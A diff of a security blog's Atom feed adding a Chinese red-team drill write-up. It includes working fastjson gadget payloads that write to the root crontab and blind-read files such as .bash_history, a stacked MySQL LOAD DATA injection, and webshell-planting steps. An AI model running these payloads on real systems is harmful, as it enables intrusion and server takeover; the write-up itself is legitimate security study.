@@ -6,7 +6,7 @@
   <link href="https://rainsec.cn/atom.xml" rel="self"/>
   
   <link href="https://rainsec.cn/"/>
-  <updated>2022-07-31T09:15:00.140Z</updated>
+  <updated>2022-08-24T02:53:17.845Z</updated>
   <id>https://rainsec.cn/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>一次攻防小记</title>
+    <link href="https://rainsec.cn/post/%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E5%B0%8F%E8%AE%B0.html"/>
+    <id>https://rainsec.cn/post/%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E5%B0%8F%E8%AE%B0.html</id>
+    <published>2022-08-24T10:38:45.000Z</published>
+    <updated>2022-08-24T02:53:17.845Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="一次攻防小记"><a href="#一次攻防小记" class="headerlink" title="一次攻防小记"></a>一次攻防小记</h1><p>​  一次攻防，第一天师傅rmi直接进了总公司内网，笔者在核心资产段打了好久没能进去，水了几天边缘分公司，队长又让打核心段，看看之前的一些弱口令，后台能不能后续利用，没办法硬着头皮打。<br>​  这个弱口令属于那种爆破可以爆破出的，但是随手试肯定不会试的，后台功能点比较多，但是生产也不敢乱动，之前师傅进后台挖过，找到了个跨目录上传和文件读取（都仅限jpg后缀），笔者经过细挖，找到个sql注入（mysql，支持堆叠，mysql用户权限较低）和fastjson（1.2.47&lt;版本&lt;1.2.68)，fatjson利用点只有两种响应，成功和失败，中间间是tomcat，不出网，然后开始尝试getshell。</p><h2 id="fastjson利用"><a href="#fastjson利用" class="headerlink" title="fastjson利用"></a>fastjson利用</h2><p>随手一试fastjson jdk8 写文件的链</p><pre><code class="json">{ "x":{        "@type":"java.lang.AutoCloseable",         "@type":"sun.rmi.server.MarshalOutputStream",        "out":{            "@type":"java.util.zip.InflaterOutputStream",            "out":{                "@type":"java.io.FileOutputStream",                "file":"/var/spool/cron/crontabs/root",                "append":false            },            "infl":{                "input":"eJzTUtCCwswUBTsF_ZLcAv2U1OJivayCdABYLgeL"            },            "bufLen":1048576        },        "protocolVersion":1    }}</code></pre><p>压缩数据生成</p><pre><code class="python">from itsdangerous import base64_decode, base64_encodeimport zlibcc='hello'.encode()ccc=zlib.compress(cc)print(base64_encode(ccc))</code></pre><p>居然成功了，写个jpg，用上面的文件读取也能读到写入的文件，当时就感觉有机会，但是苦于没有路径，然后试commons-io 发现存在依赖，尝试读文件的链子</p><pre><code class="json">{  "abc":{"@type": "java.lang.AutoCloseable",    "@type": "org.apache.commons.io.input.BOMInputStream",    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",        "url": "file:///tmp/"      },      "charsetName": "UTF-8",      "bufferSize": 1024    },"boms": [      {        "@type": "org.apache.commons.io.ByteOrderMark",        "charsetName": "UTF-8",        "bytes": [          ...        ]      }    ]  },  "address" : {"$ref":"$.abc.BOM"}}</code></pre><p>但是没有回显，无法判断，随后拜读浅蓝师傅的文章 <a href="https://b1ue.cn/archives/506.html">https://b1ue.cn/archives/506.html</a></p><p>前面读文件的链子bytes和读的文件匹配，getBOM会返回这个bytes，然后下面利用类型不匹配，让fastjson报错，服务器返回“错误”，来实现盲注读文件</p><p>通过读/root/.bash_history等拿到tomcat路径</p><pre><code class="json">{  "abc":{"@type": "java.lang.AutoCloseable",    "@type": "org.apache.commons.io.input.BOMInputStream",    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",        "url": "file:///tmp/test"      },      "charsetName": "UTF-8",      "bufferSize": 1024    },"boms": [      {        "@type": "org.apache.commons.io.ByteOrderMark",        "charsetName": "UTF-8",        "bytes": [          98        ]      }    ]  },  "address" : {"@type": "java.lang.AutoCloseable","@type":"org.apache.commons.io.input.CharSequenceReader","charSequence": {"@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},"start": 0,"end": 0}}</code></pre><p>但是很可惜，实战环境有点复杂，经过小修改之后链子只能用来探测路径或文件是否存在，无论如何类型匹配那都不报错，笔者尝试不读文件进行对比，直接返回byte，实战环境也不报错，只能fuzz一下tomcat路径，也没fuzz出来，gg。</p><h2 id="写计划任务"><a href="#写计划任务" class="headerlink" title="写计划任务"></a>写计划任务</h2><p>试了一下写计划任务，/var/spool/cron/root写不进去，很奇怪（后来发现是队长开始写了一次，写进去了，但是语法有问题，文件不知道为啥被锁了，后来就写不进去了，覆盖追加都不行），尝试其他用户常见用户名也都失败，用mysql读了一下安装路径，发现是/home/soft ,写/var/spool/cron/soft ，也没执行，窒息.jpg。</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>fastjson没啥看了，去深入一下注入，发现可以堆叠，在secure-file-priv=NULL时，可以尝试下面这种方法读文件 ,很全的一篇mysql注入文章 <a href="https://xz.aliyun.com/t/7169#toc-32">https://xz.aliyun.com/t/7169#toc-32</a></p><pre><code class="SQL">drop table mysql.m1;CREATE TABLE mysql.m1 (code TEXT );LOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '';select * from mysql.m1;</code></pre><p>可惜还是不行，后来才知道在local_infile变量开启时候这种方法才可以读到文件，另外这站还是站库分离，mysql在阿里云上，当时竟然没测一下，浪费了不少时间，还是菜，当然这都是后话，泪.jpg。<br>到现在没得其他思路了，而且这个站已经搞了好几天了，也没搞下来，太菜了呜呜呜。</p><h2 id="二战"><a href="#二战" class="headerlink" title="二战"></a>二战</h2><p>过了两天又来日这个站，另一个师傅扫了一下目录，发现个nginx的配置文件，配置文件可以看出这个站的后台接口是被代理到另一个内网服务器，配置文件里还发现个转发服务器地址，它刚好有个druid，刚好是个弱口令，主页看到classpath，/root/soft/apache-tomcatxxxxxx（xxxxx为版本号） ,刚好这个站也有个soft用户，回去一试，/home/soft/apache-tomcatxxxxx路径存在！！！！！！！！！！！！！<br>随后就是写shell了，不知道为啥完整的shell压缩之后用fastjson写进去会报错，把shell分成几部分追加写，写文件链子里的append false改为true。<br>附一个笔者常用的在没有waf的情况下检测fastjosn的小技巧，json数据里，加上 </p><pre><code class="json">"@type":"xxxx"</code></pre><p>一般是fatjson就会报错，这次这个站就是这么发现的，后台接口很多，但是只有这一个地方的一个参数传的是json数据,也不出网。<br>小总结一下吧，端口要扫全，弱口令都要试一下，能爆破就爆破，目录该扫也要扫，毕竟渗透本质是信息收集。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;一次攻防小记&quot;&gt;&lt;a href=&quot;#一次攻防小记&quot; class=&quot;headerlink&quot; title=&quot;一次攻防小记&quot;&gt;&lt;/a&gt;一次攻防小记&lt;/h1&gt;&lt;p&gt;​  一次攻防，第一天师傅rmi直接进了总公司内网，笔者在核心资产段打了好久没能进去，水了几天边缘分公司，队</summary>
+      
+    
+    
+    
+    <category term="渗透测试" scheme="https://rainsec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+    <category term="渗透测试" scheme="https://rainsec.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
   
   <entry>
     <title>Fuzzing之Grammars</title>
